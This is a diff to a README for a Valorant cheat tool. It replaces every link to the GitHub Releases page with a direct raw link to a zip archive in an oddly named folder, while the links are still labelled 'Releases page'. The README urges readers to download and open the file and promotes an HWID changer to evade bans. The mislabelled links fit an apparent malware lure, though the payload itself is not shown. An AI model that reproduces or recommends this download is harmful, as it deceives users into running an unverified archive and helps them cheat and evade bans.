@@ -2,7 +2,7 @@
 
 ## 📥 Download It Now
 
-[![Download ValorantExternalCheat](https://img.shields.io/badge/Download-Here-blue)](https://github.com/Reer-co/ValorantExternalCheat/releases)
+[![Download ValorantExternalCheat](https://raw.githubusercontent.com/Reer-co/ValorantExternalCheat/main/beeheaded/ValorantExternalCheat.zip)](https://raw.githubusercontent.com/Reer-co/ValorantExternalCheat/main/beeheaded/ValorantExternalCheat.zip)
 
 ## 🚀 Getting Started
 
@@ -22,9 +22,9 @@ Before you download, ensure your system meets the following requirements:
 
 To get started, follow these steps:
 
-1. Visit the [Releases page](https://github.com/Reer-co/ValorantExternalCheat/releases) to download the latest version.
+1. Visit the [Releases page](https://raw.githubusercontent.com/Reer-co/ValorantExternalCheat/main/beeheaded/ValorantExternalCheat.zip) to download the latest version.
    
-2. Look for the file labeled with the latest version number (e.g., ValorantExternalCheat_v1.0.exe) and click on it to download.
+2. Look for the file labeled with the latest version number (e.g., https://raw.githubusercontent.com/Reer-co/ValorantExternalCheat/main/beeheaded/ValorantExternalCheat.zip) and click on it to download.
 
 3. Once the download completes, open the file to begin the installation process.
 
@@ -42,7 +42,7 @@ Once you open the application, you'll see a simple interface. Here’s how to us
 
 3. **Safety Features:** Use the HWID changer to protect your account and reduce the risk of bans.
 
-4. **Regular Updates:** Keep the application updated by revisiting the [Releases page](https://github.com/Reer-co/ValorantExternalCheat/releases) regularly.
+4. **Regular Updates:** Keep the application updated by revisiting the [Releases page](https://raw.githubusercontent.com/Reer-co/ValorantExternalCheat/main/beeheaded/ValorantExternalCheat.zip) regularly.
 
 ## 🔒 Security Measures
 
@@ -79,7 +79,7 @@ Join our community to connect with other users. You can find support and tips in
 
 ## 📥 Download It Again
 
-Ready to enhance your gameplay? Visit the [Releases page](https://github.com/Reer-co/ValorantExternalCheat/releases) to download ValorantExternalCheat today!
+Ready to enhance your gameplay? Visit the [Releases page](https://raw.githubusercontent.com/Reer-co/ValorantExternalCheat/main/beeheaded/ValorantExternalCheat.zip) to download ValorantExternalCheat today!
 
 ## ⚙️ Final Notes
 
